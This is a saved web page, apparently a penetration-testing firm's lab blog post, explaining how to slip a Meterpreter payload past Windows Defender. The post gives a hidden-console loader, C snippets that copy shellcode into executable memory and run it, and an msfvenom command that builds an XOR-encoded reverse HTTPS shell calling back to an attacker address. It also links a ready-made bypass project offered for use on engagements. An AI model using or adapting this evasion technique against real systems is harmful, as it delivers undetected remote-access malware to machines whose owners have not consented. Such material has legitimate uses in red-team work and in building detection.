@@ -1,0 +1,285 @@
+<!doctype html>
+
+<html lang="en-GB">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  	<meta property="fb:page_id" content="413247712183723">
+	<meta property="og:site_name" content="Hacker House">
+	<meta name="twitter:site:id" content="3358636906">
+	<meta property="og:type" content="article">
+	<meta name="twitter:card" content="summary_large_image">
+	<title>Windows Defender Bypassing For Meterpreter</title>
+	<link rel="canonical" href="https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/">
+	<meta name="description" content="If you have done any kind of hacking against Windows enterprise environments lately, you will have noticed that the detection routines of Microsoft Defender have been improving significantly. Many common anti-malware scan interface (AMSI) bypass tricks are now trivially detected and it can be quite difficult for an inexperienced hacker to get a payload running....">
+	<meta property="og:title" content="Windows Defender Bypassing For Meterpreter">
+	<meta property="og:url" content="https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/">
+	<meta property="og:description" content="If you have done any kind of hacking against Windows enterprise environments lately, you will have noticed that the detection routines of Microsoft Defender have been improving significantly. Many common anti-malware scan interface (AMSI) bypass tricks are now trivially detected and it can be quite difficult for an inexperienced hacker to get a payload running....">
+	<meta property="og:image" content="https://hacker.house/wp-content/themes/hackerhouse/resources/assets/images/share.jpg">
+	<meta name="twitter:title" content="Windows Defender Bypassing For Meterpreter">
+	<meta name="twitter:url" content="https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/">
+	<meta name="twitter:description" content="If you have done any kind of hacking against Windows enterprise environments lately, you will have noticed that the detection routines of Microsoft Defender have been improving significantly. Many common anti-malware scan interface (AMSI) bypass tricks are now trivially detected and it can be quite difficult for an inexperienced hacker to get a payload running....">
+	<meta name="twitter:image" content="https://hacker.house/wp-content/themes/hackerhouse/resources/assets/images/share.jpg">
+<link rel='dns-prefetch' href='//ajax.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://hacker.house/wp-includes/css/dist/block-library/style.min.css?ver=1fa494e995a643a38fd5efe4ac39cbab' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-block-vendors-style-css'  href='https://hacker.house/wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/vendors-style.css?ver=3.4.0' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-block-style-css'  href='https://hacker.house/wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/style.css?ver=3.4.0' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://hacker.house/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-layout-css'  href='https://hacker.house/wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css?ver=4.6.0' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-smallscreen-css'  href='https://hacker.house/wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen.css?ver=4.6.0' type='text/css' media='only screen and (max-width: 768px)' />
+<link rel='stylesheet' id='woocommerce-general-css'  href='https://hacker.house/wp-content/plugins/woocommerce/assets/css/woocommerce.css?ver=4.6.0' type='text/css' media='all' />
+<style id='woocommerce-inline-inline-css' type='text/css'>
+.woocommerce form .form-row .required { visibility: visible; }
+</style>
+<link rel='stylesheet' id='sage/main.css-css'  href='https://hacker.house/wp-content/themes/hackerhouse/dist/styles/main_790976ee.css' type='text/css' media='all' />
+<script type='text/javascript' id='utils-js-extra'>
+/* <![CDATA[ */
+var userSettings = {"url":"\/","uid":"0","time":"1603756292","secure":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://hacker.house/wp-includes/js/utils.min.js?ver=1fa494e995a643a38fd5efe4ac39cbab' id='utils-js'></script>
+<link rel="https://api.w.org/" href="https://hacker.house/wp-json/" /><link rel='shortlink' href='https://hacker.house/?p=6599' />
+	<link rel="shortcut icon" href="https://hacker.house/wp-content/themes/hackerhouse/dist/images/favicon.png" />
+	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
+	<link rel="icon" href="https://hacker.house/wp-content/uploads/2018/07/cropped-hh-favico-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://hacker.house/wp-content/uploads/2018/07/cropped-hh-favico-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://hacker.house/wp-content/uploads/2018/07/cropped-hh-favico-180x180.png" />
+<meta name="msapplication-TileImage" content="https://hacker.house/wp-content/uploads/2018/07/cropped-hh-favico-270x270.png" />
+</head>
+  <body class="labs-template-default single single-labs postid-6599 modal-open theme-hackerhouse/resources woocommerce-no-js woocommerce-multicurrency-USD windows-defender-bypassing-for-meterpreter">
+    
+    <div class="container">
+  <header>
+    <div class="row">
+      <div class="col-md-12">
+        <a class="logo" href="https://hacker.house/" title="Home page"><span>Hacker House</span></a>
+                <a class="menu" title="Menu"><span></span><span></span><span></span></a>
+        <nav class="main-menu">
+                      <ul id="menu-main-menu" class="menu"><li id="menu-item-37" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37"><a href="https://hacker.house/training/">Training</a></li>
+<li id="menu-item-35" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35"><a href="https://hacker.house/services/">Services</a></li>
+<li id="menu-item-1219" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1219"><a href="https://hacker.house/shop/">Shop</a></li>
+<li id="menu-item-5425" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5425"><a href="https://hacker.house/press-blog/">Press &#038; Blog</a></li>
+<li id="menu-item-40" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-40"><a href="https://hacker.house/about/">About</a></li>
+<li id="menu-item-5557" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5557"><a href="https://hacker.house/labs/">Labs</a></li>
+<li id="menu-item-1701" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1701"><a href="https://dashboard.hacker.house/">Portal</a></li>
+<li id="menu-item-38" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38"><a href="https://hacker.house/contact/">Contact</a></li>
+</ul>
+                  </nav>
+      </div>
+    </div>
+  </header>
+</div>
+
+    <main class="main">
+            
+          <div class="modal false dark" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+          <div class="modal-content">
+            <div class="modal-header">
+              <a href="/labs/" class="btn-close" aria-label="Close"></a>
+            </div>
+            <div class="modal-body">
+              <div class="post-content">
+    
+    <article class="post-6599 labs type-labs status-publish hentry">
+  <div class="content">
+    <h1>Windows Defender Bypassing For Meterpreter</h1>
+    <div class="meta">
+  <span class="date updated" datetime="2020-01-28T00:17:19+00:00">27.01.2020</span>
+  <span class="author vcard">by <a href="https://hacker.house/author/hackerhouse/" rel="author" class="fn">
+    Admin
+  </a></span>
+</div>
+    <p>If you have done any kind of hacking against Windows enterprise environments lately, you will have noticed that the detection routines of Microsoft Defender have been improving significantly. Many common anti-malware scan interface (AMSI) bypass tricks are now trivially detected and it can be quite difficult for an inexperienced hacker to get a payload running. I recently had to bypass Windows Defender running on a Windows 10 Enterprise host and this blog post documents the result, a rather simple way of evading Defender. It used to be the case that generating a &#8220;meterpreter&#8221; payload using &#8220;msfvenom&#8221; as PowerShell or similar scripted output would permit you to load your code directly onto a Windows host with little effort, or using a PE with strong encoders then injected with another binary using Shellter. However, that has now changed with AMSI being able to detect most garden variety scripted payloads and msfvenom generated binaries mostly being detected by Defender. Windows Defender isn&#8217;t entirely fool proof however and it takes little work to bypass the detection routines through use of native code loaded from a DLL. We created a shellcode loading harness Peony[0] that implements the bypass described here and can be used with x86 and x64 meterpreter payloads rather generically to defeat Windows Defender. The project creates a console application Loader.exe which has one main purpose, to load Payload.dll into memory and hide the application&#8217;s console Window. This application then quietly sits in the background, invisible to the user and runs in an infinite loop allowing our Payload routines to complete.</p>
+<p><code>HMODULE PayloadDLL;<br />
+PayloadDLL = LoadLibrary(L"Payload.dll");</code></p>
+<p>The Payload.dll is responsible for taking a &#8220;msfvenom&#8221; generated payload, mapping it into read, write and executable memory then transferring execution flow to the position independent shellcode to load meterpreter onto the host. It does this by first creating a thread inside the DllMain function which is called when the DLL is loaded into memory by the Loader. Once inside our thread we map a page of memory the same size as our shellcode. We copy our shellcode into this newly mapped memory and execute it directly as a function. The code is similar to the following.</p>
+<p><code>pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br />
+memcpy(pShellcode, shellcode, sizeof(shellcode)-1);<br />
+int (*func)();<br />
+func = (int (*)()) pShellcode;<br />
+(*func)();<br />
+</code></p>
+<p>If you generate a Payload.dll containing a trivial to detect Windows shellcode (such as an entirely unencoded or unencrypted payload) then Windows Defender will certainly identify your DLL as malicious and quarantine the file. As such you must still encode your shellcode that will be loaded from the DLL to ensure that it bypasses signature based detection. Metasploit version 5 now supports generating encrypted payloads using msfvenom, supplying the &#8220;&#8211;encrypt&#8221; option allows to create a payload encrypted with RC4, AES256 or encoded output using Base64 or XOR. It transpires that simply XOR encoding your payload routine is sufficient and using the built-in &#8220;x86/xor_dynamic&#8221; encoder is all that is needed to generate a signature-free DLL. Despite Windows Defender offering significant improved detection lately for common routines and generated binaries, it is still trivial to bypass and offers little protection against meterpreter. You can use our Peony solution which contains both a Loader project and Payload project for compiling a generic meterpreter bypassing payload for use on engagements, however it is likely that this will become detected in the near future and as such a variation of this should be adapted for your own uses. We highly recommend making use of Windows CryptoAPI and using an AES256 encrypted payload to further deter detection of shellcode within a payload.dll, left as an exercise to the reader, however XOR seems wholly sufficient at present. As an example the following msfvenom command can be used to generate a payload and then replace the shellcode variable in Payload.cpp with your own payload.c buf entry. You will need Visual Studio to compile the project files.</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.10.2 LPORT=443 --encoder x86/xor_dynamic -f c -o payload.c</code></p>
+<p>Windows Defender will often send suspicious samples to the cloud for detection and any generated files will have a limited shelf-life especially if you use meterpreter&#8217;s advanced features, however simply adjusting the technique to add better encryption or using timers to force timeouts can help prevent this (see commented code for examples). Ultimately, any payload generated using the sample project here should not expect to last long but can be used as a starting point for your own methods of loading meterpreter onto a Windows Defender protected host. Some of the concepts here are outlined in a blog post by Wei Chen over at the Rapid7 blog[1]. Happy Hacking!</p>
+<p>[0] <a href="https://github.com/hackerhouse-opensource/backdoors/blob/master/Peony.zip?raw=true">Peony.zip &#8211; a Visual Studio project to bypass Windows Defender with meterpreter</a><br />
+[1] <a href="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/">Hiding Metasploit Shellcode to Evade Windows Defender</a></p>
+
+  </div>
+</article>
+
+                </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="modal-backdrop show"></div>
+    
+      </main>
+
+    
+    <footer>
+    <section class="contact middle green fingerprint">
+    <div class="container">
+            <h2>Questions? Contact us now.</h2>
+            <a class="button bcall" href="tel://+1-415-603-2521">Call +1-415-603-2521</a>
+      <a class="button bcontact" href="/contact/">Or send us a message</a>
+    </div>
+  </section>
+  <section class="info fingerprint bottom gray">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-4 col-sm-6 col-xs-12">
+          <a class="logo" href="https://hacker.house/" title="Home page"><span>Hacker House</span></a>
+          <p class="special">In <b>California</b>,<b> London</b> &amp; <b>0.0.0.0/0</b></p>
+          <p><b>US</b> <a href="tel://+14156032521">+1-415-603-2521 </a></p>
+<p><b>UK</b> <a href="tel://+442081231379">+44 (0) 208 123 1379</a></p>
+<p><a href="mailto:info@hacker.house">info@hacker.house</a></p>
+
+          <ul class="social-profiles d-block d-sm-none">
+                        <li><a class="icon-twitter" href="https://twitter.com/myhackerhouse"
+             title="Twitter" target="_blank"><span>Twitter</span></a></li>
+                                    <li><a class="icon-facebook" href="https://www.facebook.com/myhackerhouse"
+             title="Facebook" target="_blank"><span>Facebook</span></a></li>
+                                    <li><a class="icon-youtube" href="https://www.youtube.com/playlist?list=PLFh6TWPhaBdDiT9Xf1JFFk9NuZOpiTr-m"
+             title="YouTube" target="_blank"><span>YouTube</span></a></li>
+                                    <li><a class="icon-github" href="https://github.com/hackerhouse-opensource?tab=repositories"
+             title="Github" target="_blank"><span>Github</span></a></li>
+                      </ul>
+        </div>
+        <div class="col-md-4 col-sm-6 col-xs-12 flex-first flex-sm-unordered">
+          <p class="title">More info</p>
+          <nav>
+                          <ul id="menu-main-menu-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-37"><a href="https://hacker.house/training/">Training</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35"><a href="https://hacker.house/services/">Services</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1219"><a href="https://hacker.house/shop/">Shop</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5425"><a href="https://hacker.house/press-blog/">Press &#038; Blog</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-40"><a href="https://hacker.house/about/">About</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5557"><a href="https://hacker.house/labs/">Labs</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1701"><a href="https://dashboard.hacker.house/">Portal</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38"><a href="https://hacker.house/contact/">Contact</a></li>
+</ul>
+                      </nav>
+                  </div>
+                <div class="col-md-4 d-none d-md-block">
+          <p class="title">Subscribe to our latest updates</p>
+          <div class="form">
+            <form id="newsletter-subscription" method="post" action="#" data-success="You&#039;ve been subscribed successfully. Thank you!" data-error="An error has occurred. Please try again later.">
+              <input id="newsletter-subscription-input" type="email" data-error="Please enter a valid email and try again." name="email" placeholder="Enter your email" />
+              <input id="newsletter-subscription-submit" type="submit" class="green" name="submit" value="S" />
+              <input type="hidden" id="security" name="security" value="aad64410ad" />
+            </form>
+            <p class="small">We respect your privacy and don't spam.</p>
+          </div>
+          <ul class="social-profiles d-none d-sm-block">
+                        <li><a class="icon-twitter" href="https://twitter.com/myhackerhouse"
+             title="Twitter" target="_blank"><span>Twitter</span></a></li>
+                                    <li><a class="icon-facebook" href="https://www.facebook.com/myhackerhouse"
+             title="Facebook" target="_blank"><span>Facebook</span></a></li>
+                                    <li><a class="icon-youtube" href="https://www.youtube.com/playlist?list=PLFh6TWPhaBdDiT9Xf1JFFk9NuZOpiTr-m"
+             title="YouTube" target="_blank"><span>YouTube</span></a></li>
+                                    <li><a class="icon-github" href="https://github.com/hackerhouse-opensource?tab=repositories"
+             title="Github" target="_blank"><span>Github</span></a></li>
+                      </ul>
+        </div>
+              </div>
+    </div>
+  </section>
+    <section class="terms">
+    <div class="container">
+      <span>&copy; 2020 - Hacker House Ltd</span>
+              <ul id="menu-footer-links" class="menu"><li id="menu-item-313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-313"><a href="https://hacker.house/privacy-policy/">Privacy policy</a></li>
+<li id="menu-item-43" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-43"><a href="https://hacker.house/terms/">Terms and conditions</a></li>
+<li id="menu-item-41" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-41"><a href="https://hacker.house/contact/">Contact</a></li>
+</ul>
+          </div>
+  </section>
+</footer>
+
+    <script>
+	jQuery(function ($) {
+
+		var name = "woocommerce_multicurrency_forced_currency";
+		var expires = 31536000;
+		var path = "/";
+		var domain = "";
+		var secure = true;
+
+		var currentURL = "https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/";
+
+		$(".woocommerce-currency-selector").on("change", function () {
+
+			wpCookies.set(name, this.value, expires, path, domain, secure);
+
+						$(document.body).trigger("wc_fragment_refresh");
+
+						window.location = currentURL;
+		});
+	});
+</script>
+
+	<div id="cookies-notice" tabindex="0">
+    <button class="close icon-close accept-button"></button>
+    <h2>All Computers Are Broken</h2>
+		<p>We use cookies to understand how you use our site and to improve your browsing experience. We only use essential cookies required for serving our website to you at all times. By continuing to use our site, you accept our use of essential cookies. If you do not agree to our use of essential cookies, click no here and you will be redirected away from our website.</p>
+    <p>
+      <a class="action accept-button">[Y]es I agree</a><a class="action deny-button">[N]o I do not agree</a>
+    </p>
+		<p class="prompt">~ HH</p>
+	</div>
+
+  	<script type="text/javascript">
+		(function () {
+			var c = document.body.className;
+			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
+			document.body.className = c;
+		})()
+	</script>
+	<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js' id='jquery-js'></script>
+<script type='text/javascript' id='contact-form-7-js-extra'>
+/* <![CDATA[ */
+var wpcf7 = {"apiSettings":{"root":"https:\/\/hacker.house\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://hacker.house/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.2.2' id='contact-form-7-js'></script>
+<script type='text/javascript' src='https://hacker.house/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.70' id='jquery-blockui-js'></script>
+<script type='text/javascript' id='wc-add-to-cart-js-extra'>
+/* <![CDATA[ */
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"View basket","cart_url":"https:\/\/hacker.house\/cart\/","is_cart":"","cart_redirect_after_add":"no"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://hacker.house/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=4.6.0' id='wc-add-to-cart-js'></script>
+<script type='text/javascript' src='https://hacker.house/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4' id='js-cookie-js'></script>
+<script type='text/javascript' id='woocommerce-js-extra'>
+/* <![CDATA[ */
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://hacker.house/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=4.6.0' id='woocommerce-js'></script>
+<script type='text/javascript' id='wc-cart-fragments-js-extra'>
+/* <![CDATA[ */
+var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_f06d827b8e0497f5e7fdb927c680bcc0","fragment_name":"wc_fragments_f06d827b8e0497f5e7fdb927c680bcc0","request_timeout":"5000"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://hacker.house/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=4.6.0' id='wc-cart-fragments-js'></script>
+<script type='text/javascript' id='sage/main.js-js-extra'>
+/* <![CDATA[ */
+var hhData = {"ajaxUrl":"https:\/\/hacker.house\/wp-admin\/admin-ajax.php","exitUrl":"https:\/\/www.duckduckgo.com"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://hacker.house/wp-content/themes/hackerhouse/dist/scripts/main_790976ee.js' id='sage/main.js-js'></script>
+<script type='text/javascript' src='https://hacker.house/wp-includes/js/wp-embed.min.js?ver=1fa494e995a643a38fd5efe4ac39cbab' id='wp-embed-js'></script>
+<!-- Google Analytics -->
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+ga('create', 'UA-132037844-1', 'auto');
+ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->  </body>
+</html>
